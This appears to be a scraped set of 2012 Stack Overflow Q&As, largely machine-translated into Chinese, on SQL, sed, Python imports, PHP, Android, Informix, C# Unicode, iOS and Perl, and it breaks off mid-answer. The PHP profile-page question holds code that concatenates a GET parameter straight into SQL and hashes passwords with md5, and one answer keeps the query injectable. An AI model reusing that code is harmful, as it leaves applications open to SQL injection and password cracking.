> 赞同：7
> 
> 时间：2012-10-26T20:03:03.607
> 
> 标签：sql, sql-server, sql-server-2008

```
ID          Zip        Room
----------- ---------- ------
317         94087      S105
318         94087      L603
1739        94404-1801 L603
1823        94401-2129 L603
1824        94401-2129 L603
2135        94404-1801 L603
2268        95136-1459 S604
2269        95136-1459 S604
3704        92673-6417 L402
4479        93454-9670 L402
4480        93454-9670 L402
4782        92395-4681 L402
4783        92395-4681 L402
4852        92886-4411 L402
4853        92886-4411 L402
4959        92673-6417 L402
5153        91773-4028 L402
5202        91773-4028 L402
5211        91765-2959 L402
5212        91765-2959 L402
5388        92336-0605 L402
5392        92336-0605 L402
5727        92870      L402
5728        92870      L402
5831        92557      L402
5916        92557      L402 
```

如何选择具有相同拉链但房间不同的 ID？

在上表中，我希望结果为：

```
ID          Zip        Room
----------- ---------- ------
317         94087      S105
318         94087      L603 
```

使用 SQL Server 2008

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-26T20:05:53.260

您可以使用[`EXISTS`](http://msdn.microsoft.com/en-us/library/ms188336.aspx)：

```
SELECT ID, Zip, Room 
FROM dbo.Table t1
WHERE EXISTS
(
   SELECT 1 FROM dbo.Table t2
   WHERE t2.Zip = t1.Zip
   AND t2.Room <> t1.Room
) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-26T20:07:09.553

```
select * 
from table t1 
join table t2 
  on t1.Zip = t2.Zip and t1.Room <> t2.Room 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-27T09:43:47.797

您可以使用窗口聚合函数`MIN()`并`MAX()`相应地获取最小值和最大值`Room`per `Zip`，然后仅选择这些值不同的行。这里：

```
WITH MinMax AS (
  SELECT
    *,
    MinRoom = MIN(Room) OVER (PARTITION BY Zip),
    MaxRoom = MAX(Room) OVER (PARTITION BY Zip)
  FROM atable
)
SELECT
  ID,
  Zip,
  Room
FROM MinMax
WHERE MinRoom <> MaxRoom
; 
```

# linux - 写入文件 Linux 终端

> ID：13093650
> 
> 赞同：0
> 
> 时间：2012-10-26T20:03:47.863
> 
> 标签：linux, sed, terminal

我正在尝试删除文件中的最后一行。我可以使用

```
sed '$d' 1 > 2 && cp 2 1 
```

有人可以告诉我一个更有效的实施。我能够使用读、写和复制来完成我的任务。是否可以仅使用一次读取和一次写入操作来执行此操作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:06:40.500

无需使用两个命令。使用`sed`的就地编辑：

```
sed -i '$d' 1 
```

# python - Python import statement semantics

> ID：13093665
> 
> 赞同：15
> 
> 时间：2012-10-26T20:05:05.773
> 
> 标签：python, python-import

I'm having difficulty understanding the import statement and its variations.

Suppose I'm using the `lxml` module for scraping websites.

The following examples show...

```
from lxml.html import parse
parse( 'http://somesite' ) 
```

...Google's python style guide prefers the basic import statement, to preserve the namespaces.

I'd prefer to do that, but when I try this:

```
import lxml
lxml.html.parse( 'http://somesite' ) 
```

...then I get the following error message:

> AttributeError: 'module' object has no attribute 'html'

Can anyone help me understand what is going on? I'd much prefer to use modules within their namespaces, but need some assistance understanding the semantics.

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-26T20:07:47.577

```
import lxml.html as LH
doc = LH.parse('http://somesite') 
```

`lxml.html` is a module. When you `import lxml`, the `html` module is not imported into the `lxml` namespace. This is a developer's decision. Some packages automatically import some modules, some don't. In this case, you have to do it yourself with `import lxml.html`.

`import lxml.html as LH` imports the `html` module and binds it to the name `LH` in the current module's namespace. So you can access the parse function with `LH.parse`.

* * *

If you want to delve deeper into when a package (like `lxml`) imports modules (like `lxml.html`) automatically, open a terminal and type

```
In [16]: import lxml

In [17]: lxml
Out[17]: <module 'lxml' from '/usr/lib/python2.7/dist-packages/lxml/__init__.pyc'> 
```

Here is you see the path to the `lxml` package's `__init__.py` file. If you look at the contents you find it is empty. So no submodules are imported. If you look in numpy's `__init__.py`, you see lots of code, amongst which is

```
import linalg
import fft
import polynomial
import random
import ctypeslib
import ma 
```

These are all submodules which are imported into the `numpy` namespace. So from a user's perspective, `import numpy` automatically gives you access to `numpy.linalg`, `numpy.fft`, etc.

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-26T20:23:00.623

Let's take an example of a package `pkg` with two module in it `a.py` and `b.py`:

```
--pkg
   |
   | -- a.py
   |
   | -- b.py
   |
   | -- __init__.py 
```

in `__init__.py` you are importing `a.py` and **not** `b.py`:

> import a

So if you open your terminal and do:

```
>>> import pkg
>>> pkg.a
>>> pkg.b
AttributeError: 'module' object has no attribute 'b' 
```

As you can see because we have imported `a.py` in pkg's `__init__.py`, we was able to access it as an attribute of `pkg` but `b` is not there, so to access this later we should use:

```
>>> import pkg.b   # OR: from pkg import b 
```

HTH,

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-26T20:15:07.997

When you `import` a package, the interpreter looks up the package on the pythonpath, then if found, parses and runs the package's `__init__.py`, building a package object from it, and inserts that object in to `sys.modules`. When `importing` a module, it does the same thing, except it creates and adds a module object. When you subsequently attempt to access an attribute (aka a member method, class, submodule, or subpackage), it retrieves the corresponding object from `sys.modules` and attempts a `getattr` on the module or package object for the child you want. However, if the child is a submodule or subpackage that has not yet been `imported`, it has not been added to `sys.modules` or the module or package's attribute list, so you get an `AttributeError`. Thus, you have to explicitly import a module or package, either in your code, or delegated in a package's `__init__.py` for it to be available at runtime on its parent.

# php - 创建个人资料页面

> ID：13093668
> 
> 赞同：0
> 
> 时间：2012-10-26T20:05:13.093
> 
> 标签：php, profile

我制作了一个注册和登录脚本，但它还需要一个个人资料页面，用户可以在其中查看他们的信息。但是当我点击登录用户时，用户的信息（id、用户名、出生）不会出现。有谁知道我做错了什么？？？

显示配置文件.php

```
<?php 
include("../includes/connection.php"); 

$id = $_GET['id']; 
?> 
<html> 
<head>
<title>User</title>
</head> 
<body> 
<?php 
$qry = "SELECT * FROM users WHERE id='".$id."'"; 
$resultaatQry = mysql_query($qry); 
$resultaat = mysql_fetch_array($resultaatQry); 
?> 
    id: <?=$id?>
    <br>
    username: <?=$resultaat['username']?>
    <br>
    birth: <?=$resultaat['birth']?> 
    <br>
</body> 
</html> 
```

用户.php

```
<?php
// Inialize session
session_start();

// Check, if username session is NOT set then this page will jump to login page
if (!isset($_SESSION['username'])) {
    header('Location: index.php');
}

?>
<html>

<head>
<title>Secured Page</title>
</head>

<body>
<?php
$qry = "SELECT * 
       FROM users 
       WHERE id='".$id."'";
$resultaatQry = mysql_query($qry);
$resultaat = mysql_fetch_array($resultaatQry); 

echo("Hallo <a href='showprofiel.php?id=".$resultaat['id']."'>".$_SESSION['username']."</a>");

echo("<br>");

?>
<br>You can put your restricted information here.</p>
<a href="../nieuws/nieuwsadmin.php">+ Nieuwsadmin</a>
<br>
<a href="logout.php">+ Logout</a>

</body>
</html> 
```

登录过程.php

```
<?php
// Inialize session
session_start();

// Include database connection settings
include('../includes/connection.php');

// Retrieve username and password from database according to user's input
$login = mysql_query("SELECT * FROM users WHERE (username = '" . mysql_real_escape_string($_POST['username']) . "') and (password = '" . mysql_real_escape_string(md5($_POST['password'])) . "')");

// Check username and password match
if (mysql_num_rows($login) == 1) {
    // Set username session variable
    $_SESSION['username'] = $_POST['username'];
    $_SESSION['id'] = $_GET['id'];
    // Jump to secured page
    header('Location: securedpage.php');
}
else 
{
    // Jump to login page
    header('Location: index.php');
}
?> 
```

干杯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:18:53.650

如果您`$id`是整数，请不要将其括在引号中。

这个：

```
$qry = "SELECT * FROM users WHERE id='".$id."'"; 
```

那么应该是：

```
$qry = "SELECT * FROM users WHERE id=$id"; 
```

作为旁注，`mysql_query()`不鼓励使用 using，因此请查看 using[`mysqli_query()`](http://www.php.net/manual/en/mysqli.query.php)或[`PDO::query()`](http://www.php.net/manual/en/pdo.query.php)方法。

正如@Mario 提到的，确保这有效：

```
id: <?=$id?> 
```

如果没有，试试这个：

```
id: <?php echo $id; ?> 
```

最后但并非最不重要的一点是，我不能说我曾见过有人用`echo`括号括起声明。我认为更好的做法是：

```
echo "<br>"; 
```

代替：

```
echo("<br>"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:07:45.373

看起来您没有在 userprofiel.php 文件中包含会话。

# java - 在进行集成安全数据库连接时使 BIRT 看到 sqljdbc_auth.dll

> ID：13093670
> 
> 赞同：0
> 
> 时间：2012-10-26T20:05:31.950
> 
> 标签：java, birt

我正在使用需要通过 jdbc 驱动程序使用集成安全性连接到数据库的 BIRT。当我的 .jar 文件（导入 BIRT）尝试连接到 MSSQL 数据库时，我收到以下错误：驱动程序未配置为集成身份验证...我的结论是 BIRT dimply 看不到 sqljdbc_auth.dll 文件.

我如何让 BIRT 看到 sqljdbc_auth.dll 库，而不是将其放入 BIRT 的根文件夹中？我可以在 BIRT RCP 中的某个地方发出 -djava.library.path = .... 吗？

谢谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T13:37:12.407

你能发布eclipse.ini吗？任何 vm 参数都应该放在新行的 -vmargs 选项之后。请参阅[http://wiki.eclipse.org/Eclipse.ini](http://wiki.eclipse.org/Eclipse.ini)。

# javascript - 纵向模式 iPad/iPhone 时禁用 Jquery

> ID：13093672
> 
> 赞同：0
> 
> 时间：2012-10-26T20:05:32.620
> 
> 标签：javascript, jquery, html, css

如何在纵向模式下禁用我的 jquery 水平滑块？它让我发疯，因为我不知道任何 javascript，所以我不知道该怎么做。

已经谢谢了，沃特

* * *

-edit-
这是 Javascript： [Javascript](http://www.wsdesigns.co.cc/js/swipe.js)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:10:27.190

这是[David Walsh](http://davidwalsh.name/orientation-change)的解决方案：

```
window.addEventListener("orientationchange", function() {
  if(window.orientation == 0 || window.orientation == 180){ //this is portrait
    //disable the slider here.
  }
  else{
    //enable the slider here
  }
}, false); 
```

> 在这些更改期间，window.orientation 属性可能会更改。值 0 [或 180] 表示纵向视图，-90 表示设备横向旋转到右侧，90 表示设备横向旋转到左侧。

# linux - /proc/filesystem 读取被调用三次

> ID：13093675
> 
> 赞同：0
> 
> 时间：2012-10-26T20:05:49.383
> 
> 标签：linux, filesystems, linux-kernel, proc

这是我的第一个内核，在下面的示例程序中，我创建了一个简单的 proc/文件系统。每当我对内核进行分类时，我都会看到 READ 被调用 3 次。想知道它为什么这样做。

出来，代码如下。

```
cat /proc/myKernel
dmesg | grep -i myKernel
myKernel: Read (/proc/myKernel) called
myKernel: Read (/proc/myKernel) called
myKernel: Read (/proc/myKernel) called

int myKernel_read( char *buffer, char **bufferLocation, off_t offset, int bufferLength, int *eof, void *data )
{
    int ret = 0;
    u64 msrvalue;

    printk(KERN_INFO "myKernel: Read (/proc/%s) called\n", procFile_name);
    ret = sprintf(buffer, "Hello World\n");

    return ret;
}

static int __init myKernel_init(void)
{
    entry = create_proc_entry(procFile_name, 0644, NULL);
    if(!entry)
        printk(KERN_INFO "myKernel: error registering proc control file\n");
    else 
    {
        entry->read_proc = myKernel_read;
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:41:51.777

问题在于 ret 值。我仍然不知道为什么这被称为三次，但是当偏移量小于零时我必须进行实际读取。

```
int myKernel_read( char *buffer, char **bufferLocation, off_t offset, int bufferLength, int *eof, void *data )
{
    int ret;
    u64 msrvalue;

    if (offset > 0) 
    {
        /* we have finished to read, return 0 */
        ret  = 0;
    } else 
    {
        /* fill the buffer, return the buffer size */
                // DO THE READ HERE. NOT OUTSIDE
                //
                printk(KERN_INFO "myKernel: Read (/proc/%s) called\n", procFile_name);
        ret = sprintf(buffer, "MyKernel = %x\n", 0);
    }

    return ret;
} 
```

# android - android 片段 android.support.v4.app.fragment 使应用程序崩溃

> ID：13093677
> 
> 赞同：2
> 
> 时间：2012-10-26T20:05:54.777
> 
> 标签：android, android-fragments, android-support-library

我已经调试了几天，不知道是什么导致了这个问题。这是我的基本设置 1\. 使用 android 4.1 sdk 2\. 想使用片段，但也需要支持旧设备，所以我使用的是 android.support.v4.*

这是我唯一的活动

我的活动.java

```
package com.example;

import android.os.Bundle;
import android.support.v4.app.FragmentActivity;

public class MyActivity extends FragmentActivity
{
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }
} 
```

我的 main.xml 布局文件由 MyActivity.java 膨胀

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    >
<TextView
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:text="Hello World, MyActivity"
    />
    <fragment name="com.example.BreadListFragment"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
              />
</LinearLayout> 
```

注意片段标签？很多示例使用片段类=....我无法使用它，因为我使用的是 android.support.v4.app.Fragment，它会给我一个错误，说不能将该特定片段转换为 android.app.fragment （来自 api 级别 11）

com.example.BreadListFragment.java 有以下代码

```
 package com.example;

import android.app.Activity;

import android.os.Bundle;
import android.support.v4.app.ListFragment;
import android.widget.ArrayAdapter;
import android.widget.ListView;

public class BreadListFragment extends ListFragment {
  int currentSelectedBreadPos = 0;

  @Override
  public void onAttach(Activity myActivity) {
    super.onAttach(myActivity);
  }

  @Override
  public void onActivityCreated(Bundle savedInstanceState) {
    super.onActivityCreated(savedInstanceState);

    if (savedInstanceState != null) {
      currentSelectedBreadPos = savedInstanceState.getInt("curBreadPos", 0);
    }
    setListAdapter(new ArrayAdapter<String>(getActivity(), android.R.layout.simple_list_item_activated_1, new String[] {"Banana", "Apple", "Watermelon"}));
    ListView lv = getListView();
    lv.setChoiceMode(ListView.CHOICE_MODE_SINGLE);
    lv.setSelection(currentSelectedBreadPos);
  }

  @Override
  public void onSaveInstanceState(Bundle outState) {
    super.onSaveInstanceState(outState);
    outState.putInt("curBreadPos", currentSelectedBreadPos);
  }

  @Override
  public void onDetach() {
    super.onDetach();
  }
} 
```

使用上面的代码，我尝试运行，应用程序崩溃，并带有以下完整堆栈区域，但这是崩溃的原因

```
 10-26 13:01:36.972: INFO/ActivityManager(1903): Start proc com.example for activity com.example/.MyActivity: pid=2036 uid=10058 gids={1015, 1023}
        java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example/com.example.MyActivity}: android.view.InflateException: Binary XML file line #12: Error inflating class fragment
        at com.example.MyActivity.onCreate(MyActivity.java:13) 
```

完整的堆栈跟踪

```
10-26 12:59:14.847: INFO/ActivityManager(1903): Process com.example (pid 1351) has died.
10-26 13:01:34.787: INFO/ApplicationPolicy(1903): isApplicationInstallationEnabled :  pkg com.example
10-26 13:01:34.797: INFO/PackageParser(1903): com.example: compat added android.permission.WRITE_EXTERNAL_STORAGE android.permission.READ_PHONE_STATE
10-26 13:01:34.842: INFO/PackageManager(1903): Removing non-system package:com.example
10-26 13:01:34.842: INFO/ActivityManager(1903): Force stopping package com.example uid=10058
10-26 13:01:34.932: INFO/PackageManager(1903): ICS_DEBUG scanPackageLI entered  com.example
10-26 13:01:34.932: INFO/PackageManager(1903): ICS_DEBUG checking for  com.example
10-26 13:01:34.932: INFO/PackageManager(1903): Running dexopt on: com.example
10-26 13:01:35.187: INFO/ActivityManager(1903): Force stopping package com.example uid=10058
10-26 13:01:35.327: DEBUG/PackageManager(1903): New package installed in /data/app/com.example-2.apk
10-26 13:01:35.567: INFO/ActivityManager(1903): Force stopping package com.example uid=10058
10-26 13:01:35.642: DEBUG/Launcher.LauncherModel(2152): --> package:com.example
10-26 13:01:35.662: DEBUG/Launcher.LauncherModel(2152): --> update package com.example
10-26 13:01:35.662: DEBUG/Launcher.LauncherModel(2152): --> package:com.example
10-26 13:01:35.692: INFO/SocialHub(28751): [UinboxReceiver] onReceive() >>   intent.getData() : com.example
10-26 13:01:36.897: INFO/ActivityManager(1903): START {flg=0x10000000 cmp=com.example/.MyActivity} from pid 2015
10-26 13:01:36.972: INFO/ActivityManager(1903): Start proc com.example for activity com.example/.MyActivity: pid=2036 uid=10058 gids={1015, 1023}
        java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example/com.example.MyActivity}: android.view.InflateException: Binary XML file line #12: Error inflating class fragment
        at com.example.MyActivity.onCreate(MyActivity.java:13) 
```

有人可以帮忙吗？并且友好地使用上面的代码运行它。或者让我知道我做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-26T20:40:31.340

你应该`android:name`在你的`fragment`标签中使用。

改变这一行...

```
<fragment name="com.example.BreadListFragment" 
```

……到这……

```
<fragment android:name="com.example.BreadListFragment" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:20:34.610

可能您在 xml 布局文件中拼写错误的片段类名称。或者您的 xml 片段文件中有错误。无论如何仔细检查你的xmls。

# sql - 在 SQL Server 中删除全局临时表的索引

> ID：13093678
> 
> 赞同：2
> 
> 时间：2012-10-26T20:05:58.853
> 
> 标签：sql, sql-server, temp-tables

> **可能重复：**
> [TSQL：临时表上的索引是否在表被删除时被删除？](https://stackoverflow.com/questions/91856/tsql-are-indexes-on-temporary-tables-deleted-when-the-table-is-deleted)

如何在 SQL Server 中手动删除全局临时表的索引？

编辑：如果您手动删除表格，您甚至需要这样做吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:10:03.637

如果要删除临时表本身，则不需要删除临时表上的索引。当您放下桌子时，它会自动发生。

[临时表上的索引在表被删除的时候会被删除吗？](https://stackoverflow.com/questions/91856/tsql-are-indexes-on-temporary-tables-deleted-when-the-table-is-deleted)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T20:41:15.860

当引用该表的所有会话结束或手动删除该表时，全局临时表将连同其索引一起销毁，但是，如果需要，您仍然可以手动删除索引。

语法是

```
drop index ##MyTempTable.MyIndex 
```

或者：

```
drop index MyIndex on ##MyTempTable 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T20:09:47.020

这对我创建然后删除索引很有用。

```
CREATE TABLE ##TempTable (Col1 int)

CREATE INDEX IDX on ##TempTable
(Col1)

DROP INDEX IDX ON ##TempTable 
```

# sql - MS SQL To Informix 11 - 按转换后的日期时间分组

> ID：13093683
> 
> 赞同：2
> 
> 时间：2012-10-26T20:06:22.553
> 
> 标签：sql, sql-server, stored-procedures, group-by, informix

我正在尝试将存储过程从 Microsoft SQL Server 2000 移动到 Informix 11。原始 SP 包含一个带有 GROUP BY 语句的最终选择语句，该语句包括转换后的日期时间：

```
group by convert(varchar(8), c.startDateTime, 1) 
```

当我将其转换为 Informix 语法时，我在运行时遇到语法错误：

```
GROUP BY (c.startDateTime::DATETIME YEAR TO DAY)::VARCHAR(10) 
```

谁能告诉我，如果可能的话，这可以在 Informix 中完成吗？如果这是不可能的，我怀疑，你通常会如何在整个查询中处理这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:15:30.317

我认为你需要从这个转换：

```
SELECT a, b, c 

FROM  ...

GROUP BY (c.startDateTime::DATETIME YEAR TO DAY)::VARCHAR(10) ; 
```

类似于：

```
SELECT a, b, c, 
    (c.startDateTime::DATETIME YEAR TO DAY)::VARCHAR(10) AS d

FROM  ...

GROUP BY 4 ;        --- meaning: the 4th column in the SELECT clause 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-28T14:16:18.437

在 Informix 中，通常不需要将日期时间字段转换为字符串来操作它们。相反，请使用扩展功能。

例如，如果`c.StartDateTime`定义为日期时间年份到秒，例如 2012-10-28 23:00:00 并且您只想要日期部分，请使用 extend ( `c.StartDateTime`, year to day)。这将返回 2012-10-28。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:19:14.797

您是否将日期的 Informix 语法转换为 mm/dd/yyyy (mssql style=1) 中的 varchar 作为

```
TO_CHAR(c.StartDateTime,"%m/%d/%iY") 
```

？？？

# php - 有没有办法释放分配给 Symfony 2 表单对象的内存？

> ID：13093689
> 
> 赞同：1
> 
> 时间：2012-10-26T20:06:44.263
> 
> 标签：php, forms, optimization, memory, symfony

我正在尝试优化使用 Symfony 2 表单在导入过程中验证数据的导入操作，有点像这个非常简化的示例：

```
/// For each imported row
foreach ($importedData as $row) {

    $user = new User;
    $userType = new UserType;

    // !! The 250 KB of memory allotted in this line is never released again !!
    $form = $symfonyFormFactory->create($userType, $user);

    // This line allots a bunch of memory as well,
    // but it's released when the EM is flushed at the end
    $form->bind($row);

    if (!$form->isValid()) {
        // Error handling
    }

    $entityManager->persist($user);
    $entityManager->flush();
} 
```

这些循环中的每一个，内存使用量都增加了大约 250 KB，这对于大量导入来说是严重的。

我发现内存泄漏来自`$form = $symfonyFormFactory->create(new UserType, $user);`线路。

编辑：实体管理器正在使用大部分内存，而不是表单组件（请参阅接受的答案）。但是每个循环仍然占用 55 KB，这比 250 KB 好，但可能会更好。只是今天没有。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T21:29:35.857

尝试禁用 SQL 日志记录以减少内存使用

```
$entityManager->getConnection()->getConfiguration()->setSQLLogger(null) 
```

[我也在这里](https://stackoverflow.com/questions/9699185/memory-leaks-symfony2-doctrine2-exceed-memory-limit)发现了类似的问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T21:08:20.227

您确定不想释放实体对象吗？首先，不要在每次迭代中刷新数据。假设持久化 50 个对象 - 我不知道您的导入数据有多大 - 并将它们刷新在一起，然后通过简单地调用 $entityManager->clear(); 来清除对象；

# jquery - Jquery datepicker 不适用于 IE6

> ID：13093697
> 
> 赞同：0
> 
> 时间：2012-10-26T20:07:00.467
> 
> 标签：jquery, jquery-ui, internet-explorer, jquery-plugins, internet-explorer-6

我在我的网站中使用这个 jquery 代码作为 datepicker。现在的问题是日期选择不适用于 IE6，但它完全适用于较新版本的 IE。
我正在使用：
**jQuery JavaScript 库 v1.7**
**jQuery UI 1.8.4**

```
<script src="../Script/![enter image description here][1]jquery.datepicker/js/jquery.date-picker.min.js" type="text/javascript"></script>
<link href="../Script/jquery.datepicker/css/smoothness/jquery-ui-datepicker.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">
    $(document).ready(function () {
        $("#<%= DateSelected.ClientId%>").datepicker({ showButtonPanel: true, closeText: 'X', dateFormat: "<%=UtilityFunctions.GetDateFormat(Page) %>" });
        $(".imgBtn").click(function (event) {
            var pos = $(event.currentTarget).position();
            $("#<%= DateSelected.ClientId%>").datepicker("show");
            $("#ui-datepicker-div").css("left", pos.left);
            $("#ui-datepicker-div").css("top", pos.top + 30);
        });
    });

<asp:Image alt="Calendar" Runat="server" ID="calendarHeader" ImageUrl="~/images/calendar.png" Width="24" height="24" class="imgBtn" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T21:12:34.907

将以下图像更改为 .Gif，它将开始工作。
ui-icons_222222_256x240.png
ui-icons_454545_256x240.png
ui-icons_888888_256x240.png

# c# - 六位 unicode 转义值比较

> ID：13093703
> 
> 赞同：4
> 
> 时间：2012-10-26T20:07:20.543
> 
> 标签：c#, unicode, unicode-escapes

我有一个六位 unicode 字符，例如`U+100000`，我希望`char`在我的 C# 代码中与另一个字符进行比较。

我对[MSDN 文档](http://msdn.microsoft.com/en-us/library/aa664669.aspx)的阅读是，这个字符不能用 a 表示`char`，而必须用 a 表示`string`。

> U+10000 到 U+10FFFF 范围内的 Unicode 字符在字符文字中是不允许的，并且在字符串文字中使用 Unicode 代理对表示

我觉得我遗漏了一些明显的东西，但是您如何才能使以下比较正常工作：

```
public bool IsCharLessThan(char myChar, string upperBound)
{
    return myChar < upperBound; // will not compile as a char is not comparable to a string
}

Assert.IsTrue(AnExample('\u0066', "\u100000"));
Assert.IsFalse(AnExample("\u100000", "\u100000")); // again won't compile as this is a string and not a char 
```

**编辑**

k，我想我需要两种方法，一种接受字符，另一种接受“大字符”，即字符串。所以：

```
public bool IsCharLessThan(char myChar, string upperBound)
{
    return true; // every char is less than a BigChar
}

public bool IsCharLessThan(string myBigChar, string upperBound)
{
    return string.Compare(myBigChar, upperBound) < 0;
}

Assert.IsTrue(AnExample('\u0066', "\u100000));
Assert.IsFalse(AnExample("\u100022", "\u100000")); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-26T20:25:18.433

To construct a string with the Unicode code point U+10FFFF using a string literal, you need to work out the [surrogate pair](http://en.wikipedia.org/wiki/UTF-16#Code_points_U.2B10000_to_U.2B10FFFF) involved.

In this case, you need:

```
string bigCharacter = "\uDBFF\uDFFF"; 
```

Or you can use `char.ConvertFromUtf32`:

```
string bigCharacter = char.ConvertFromUtf32(0x10FFFF); 
```

It's not clear what you want your method to achieve, but if you need it to work with characters not in the BMP, you'll need to make it accept `int` instead of `char`, or a `string`.

As per the documentation for [`string`](http://msdn.microsoft.com/en-us/library/system.string.aspx), if you want to iterate over characters in a string as full Unicode values, use [`TextElementEnumerator`](http://msdn.microsoft.com/en-us/library/system.globalization.textelementenumerator.aspx) or [`StringInfo`](http://msdn.microsoft.com/en-us/library/system.globalization.stringinfo.aspx).

Note that you *do* need to do this explicitly. If you just use ordinal values, it will check *UTF-16* code units, not the UTF-32 code points. For example:

```
string text = "\uF000";
string upperBound = "\uDBFF\uDFFF";
Console.WriteLine(string.Compare(text, upperBound, StringComparison.Ordinal)); 
```

This prints out a value greater than zero, suggesting that `text` is greater than `upperBound` here. Instead, you should use [`char.ConvertToUtf32`](http://msdn.microsoft.com/en-us/library/z2ys180b.aspx):

```
string text = "\uF000";
string upperBound = "\uDBFF\uDFFF";
int textUtf32 = char.ConvertToUtf32(text, 0);
int upperBoundUtf32 = char.ConvertToUtf32(upperBound, 0);
Console.WriteLine(textUtf32 < upperBoundUtf32); // True 
```

So that's probably what you need to do in your method. You might want to use [`StringInfo.LengthInTextElements`](http://msdn.microsoft.com/en-us/library/system.globalization.stringinfo.lengthintextelements.aspx) to check that the strings really are single UTF-32 code points first.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-11T12:49:28.893

From [https://msdn.microsoft.com/library/aa664669.aspx](https://msdn.microsoft.com/library/aa664669.aspx), you have to use `\U` with full 8 hex digits. So for example:

```
string str1 = "\U0001F300";
string str2 = "\uD83C\uDF00";
bool eq = str1 == str2; 
```

using the [:cyclone:](http://www.fileformat.info/info/unicode/char/1f300/index.htm) emoji.

# iphone - Modal Segue iOS后同一个TabBarController的多个实例

> ID：13093704
> 
> 赞同：2
> 
> 时间：2012-10-26T20:07:22.763
> 
> 标签：iphone, ios, ipad, memory, uitabbarcontroller

我有一个带有一个主 TabBarController 的应用程序，其中包含两个控制两个不同视图 A 和 B 的选项卡。视图 A 是滚动视图，视图 B 是表视图。当我最初加载应用程序时，视图 A 中的滚动视图为空。

为了将页面添加到我的滚动视图，我将其设置如下：我转到视图 B 并对嵌入了导航栏的视图执行一个模态搜索。导航栏只有一个按钮“取消”，我用它来关闭视图。否则，用户必须单击图像并执行另一个模态搜索到不同的视图。这个视图没有导航栏，只有一个按钮“完成”，我用它来执行返回初始 tabBarController 的模态。

这是问题所在：按“完成”后，页面被添加到滚动视图中，没有错误。但是，我相信我现在有两个相同的 tabBarController 实例在内存中浮动。当我尝试使用不同的按钮获取 scrollView 中包含的视图时，它告诉我它现在是空的（即使在 viewDidLoad 和 viewDidAppear 期间它已满）。

如何删除初始 tabBarController 视图，或者如何重新回到我已经分配的 tabBarController ？任何帮助将不胜感激！谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T05:51:30.253

您不应该转回原始视图控制器。相反，您应该关闭当前的动画视图控制器，并显示您原来的 tabBarController。

在您要返回的视图中，添加：

```
tabBarController *tabs = (tabBarController*)[[self presentingViewController]presentingViewController];
tabs.selectedViewController = [tabz.viewControllers objectAtIndex:0];

[[[self presentingViewController] presentingViewController] dismissViewControllerAnimated:YES completion:nil]; 
```

然后您将看到视图 A 并仍然使用相同的分配。

# perl - 如何在 bash shell 脚本中的 perl 命令调用中使用 shell 变量？

> ID：13093709
> 
> 赞同：16
> 
> 时间：2012-10-26T20:07:29.417
> 
> 标签：perl, bash, shell, awk

如何在 bash shell 脚本中的 perl 命令调用中使用 shell 变量？

我的 shell 脚本中有一个 perl 命令来评估日期 -1。

我如何`$myDate`在 perl 命令调用中使用？

这是我脚本中的部分：

```
myDate='10/10/2012'

Dt=$(perl -e 'use POSIX;print strftime '%m/%d/%y', localtime time-86400;") 
```

我想用来`$myDate`代替`%m/%d/%y`.

任何帮助将不胜感激。

谢谢你。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-10-26T20:49:27.410

来自 shell 的变量在 Perl 的`%ENV`散列中可用。使用`bash`（和其他一些 shell），您需要采取额外的步骤“导出”您的 shell 变量，以便子进程可以看到它。

```
mydate=10/10/2012
export mydate
perl -e 'print "my date is $ENV{mydate}\n"' 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-26T20:14:09.463

与将值传递给任何其他程序的方式相同：将其作为 arg 传递。（您可能很想生成 Perl 代码，但这是个坏主意。）

```
Dt=$( perl -MPOSIX -e'print strftime $ARGV[0], localtime time-86400;' -- "$myDate" ) 
```

请注意，代码并不总是返回昨天的日期（因为并非所有日子都有 86400 秒）。为此，你想要

```
Dt=$( perl -MPOSIX -e'my @d = localtime time-86400; --$d[4]; print strftime $ARGV[0], @d;' -- "$myDate" ) 
```

或者

```
Dt=$( perl -MDateTime -e'print DateTime->today(time_zone => "local")->subtract(days => 1)->strftime($ARGV[0]);' -- "$myDate" ) 
```

或者干脆

```
